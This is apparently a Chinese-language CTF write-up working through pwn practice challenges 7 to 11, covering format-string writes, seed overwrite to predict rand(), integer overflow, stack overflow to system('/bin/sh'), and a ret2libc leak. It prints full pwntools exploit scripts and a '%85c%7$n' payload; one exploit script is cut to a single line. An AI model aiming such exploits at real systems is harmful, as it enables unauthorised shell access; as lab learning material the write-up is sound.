    7.string：

    分析程序：

    程序开始，main主函数里有：
    v4=malloc(8uLL) ，动态分配内存，地址赋给v4。
    v5=(_int64)v4 ，即v4赋值给v5，相当于v4和v5都指向同一地址。
    *v4=68 ，就相当于v4[0]=68
    然后令 v4[1]=85

    程序一开始就告诉我两个secret，secret[0]是v4的地址，secret[1]是v4+1的地址（即v4[1]的地址）。
    然后进入sub_400D72：要求输入勇士的名字，随便输入，然后建立一个勇士，没啥毛病。

    然后是三个函数，从上到下依次进入咯。

    先进入第一个函数sub_400A7D：
    要求选择east还是up？若选择了east，则strcmp（&s1,”east”）的结果为0，就不执行if语句，直接退出这个函数。这里直接退出就行了，所以选择east。

    然后进入第二个函数sub_400BB9：要求是there（1）还是leave（0）？不过我们发现这个函数里面有格式化字符串漏洞，那么就必须要利用一下。如果选择0，那么就退出这个函数了！所以我们选择1，继续待在这个函数，利用格式化字符串漏洞。
    接着程序提示，让我们输入一个地址，我们输入v4[0]的地址进去，程序会把我们所输入的地址存入到v2里，所以我们就要想办法知道这个v2在栈中的什么位置，这一点可以通过格式化漏洞解决，经测试，是在第七个参数。
    然后下一步提示你的wish，我们要利用这里来修改v4[0]的数据，所以输入%85c%7$n，即将85写入栈内第7个参数所指向的地址，将v4[0]的值改为85（格式化字符串漏洞任意写），程序正常走完，退出。

    最后进入第三个函数sub_100CA6：
    我这里的if语句是if ( (_DWORD *)a1 == *(_DWORD *)(a1 + 4) )
    而别人wp的语句是if（    a1==a1[1]），怎么回事？后续补充：后来学到了一个知识，鼠标右键选择hide casts，即可省略一些东西，方便阅读。hide casts之后，这语句变为了( a1 == *(a1 + 4) )，但仔细想想还是可以理解的，每个数据限定4个字节，a1是a1[0]，所以a1+4不就是a1[1]嘛
    而    a1就是a1[0]
    所以要使得程序中 a1[0]=a1[1]
    而要注意的是，sub_100CA6函数被sub_400D72函数调用时，所传入的实参是a1，即sub_100CA6(a1)
    而sub_400D72函数被main主函数调用时所传入的实参是v5，即sub_400D72(v5)
    而v5=v4！所以这么一回溯的话，得出 *a1=a1[0]=v4[0]=68
    但是现在a1[1]=v4[1]=85 ≠ v4[0]的68
    所以就要利用第二个流程里的格式化字符串漏洞任意写的功能来实现修改了，我们之前也介绍过了，可以将v4[0]的值改为85，使其与v4[1]即a1[1]相等。然后令if语句判断成立。
    继续看下面程序，
    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);
    该语句是将v1转化为可执行函数（我是看不懂啥意思的，，，还是死记硬背吧）
    hide casts之后是(v1)(0LL, v1);
    本题没有system函数，所以要在此处写个shellcode来执行、
    刚好有个read函数读取我们的shellcode，完美。

    总结一下：通过格式化字符串漏洞修改v4[0]的值，使之与v4[1]相等（当然你也可以改v4[1]的值）。然后就可以读入shellcode，由于有一条指令是将v1强制转化为函数指针类型的，所以我们的shellcode就可以运行了。

    8.guess_number：

    通过gets函数覆盖seed值（v8和seed相距0x20），劫持rand函数

    伪随机数
    猜10次数字，范围1~6。猜对直接拿到flag.
    漏洞点在于：
    相同的环境下，如果不设定(srand)一个种子(seed)的话，每次随机到的随机数序列是相同的。比如种子为0时，在linux下的随机数序列为{2,5,4,2,6,2,5,1,4,2,…}
    （想要每次运行时得到的随机数序列不同，可以每次运行都设定一个不同的种子，比如时间）
    所以我们可以通过输入v7时覆盖掉seed[0]，使得种子恒定。然后本地用C语言，针对某一种子，求出其随机数序列中的前十个。
    （注意！windows和linux求出的随机数序列不同，这是个坑，所以我们要在linux上实现C语言随机生成）

    C脚本如下：

    #include <stdio.h>
#include <stdlib.h>
int main(){
    srand(2333);  
    for (int i=0; i<=9; i++){
        printf("%d,", rand() % 6 + 1);
    }
    printf("\n");
}

    播撒的种子是 2333
    gcc 8.cpp -o 8，进行编译，得到可执行文件8。
    运行./8即可得到随机数：4,2,5,3,3,3,4,1,1,1,

    所以这些所谓随机数我们也知道了。
    exp脚本如下：

p.interactive()

    9.int_overflow：

    漏洞点：整数溢出

    read函数读入长度为0x199的passwd
    对passwd进行判断，if(长度<=3 或者 长度>8)则视为无效数据，所以只有长度介于[4,8)的passwd才会被写入dest栈内

    v3=strlen(s)。v3由于是无符号整数，所以范围是0~255，超出会造成整数溢出
    但又不能溢出，s的长度范围只能介于[4,8)，那咋办呢？
    整数溢出漏洞了解一下！

    整数溢出的漏洞：
    对于check_passwd函数开头定义的_int8（8bit），其最大为255。
    当传入256时，会产生高位截断，取其低位，故256和1相等。 等效于 mod 255
    所以我们可以构造passwd的长度介于[255+4,255+8)

    程序若正常运行是不会执行 what_is_this 函数的，所以就要想办法执行。所以就要让s溢出后的返回地址覆盖为 what_is_this 函数的地址，那么就可执行得到flag；

    本题中，我们的目标是覆写返回地址r，改为调用system(“cat flag”);的函数的地址。

    我们跟入dest，发现dest位于00000014，而s位于00000000.
    所以dest距s是0x14h（20字节），再加上ebp（4字节）的大小，所以需要24个字节paddings垃圾数据填充

    EXP脚本如下：

    from pwn import *
sh=process('./of')
flag_addr=0x804868B
sh.recvuntil('Your choice:')
sh.sendline("1")
sh.recvuntil("username:")
sh.sendline("sixpar")
sh.recvuntil("passwd:")
payload = "a"*0x18+p32(flag_addr)
payload = payload.ljust(259,"a") #绕过检测
sh.sendline(payload)
sh.interactive()

    10.cgpwn2:

    本题和第六题 level2的原理相同，能找到sysytem函数的地址 0x8048420，而唯一的区别在于此题没有cat flag或binsh的字符串，需要自己构造。

    hello函数中存在gets函数，即gets(&s)，那么这里就存在栈溢出漏洞，栈大小是0x26

    查看发现，name位于bss区，即bss段地址:0804A080，bss即表示未被初始化，所以可将需要构造的字符串写入到name变量（bss段上）。
    EXP脚本如下：

    from pwn import *
p=process('./cg')
string_addr=0x804a080   # bss段地址
system_addr=0x8048420
payload='a'*(0x26+4)+p32(system_addr)+'a'*4+p32(string_addr) #system函数的参数是bss段内容
p.recvuntil('please tell me your name')  #gets函数读取
p.sendline('/bin/sh')  #name将写入bss段上
p.recvuntil('hello,you can leave some message here:')
p.sendline(payload)
p.interactive()

    11.level3:

    程序里没有找到system函数和“/bin/sh”字符串，所以只好自己通过泄露libc基址，然后通过偏移计算得到。

    #-*-coding:utf-8-*-
from pwn import *
#sh = remote("111.198.29.45","39255")
sh = process('./level3')
elf = ELF('./level3')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')

write_plt = elf.plt['write']
write_got = elf.got['write']
vuln = 0x0804844B
print "write_plt =",hex(write_plt)
print "vuln =",hex(vuln)

payload = 'A'*140+p32(write_plt) +p32(vuln)  #write(1,write_got,4)  #retn
payload += p32(1) + p32(write_got) + p32(4)  #args
sh.sendlineafter(':\n', payload)

write_addr = u32(sh.recv(4))   #leak write_got
print "write_addr =",hex(write_addr)
libcbase = write_addr - libc.symbols['write']
system_addr = libcbase + libc.symbols['system']
binsh_addr = libcbase + libc.search('/bin/sh\x00').next()
print "libcbase =",hex(libcbase)
print "system_addr =",hex(system_addr)
print "binsh_addr =",hex(binsh_addr)

payload = 'A'*140+p32(system_addr)+'a'*4+p32(binsh_addr)
sh.sendline(payload)
sh.interactive()
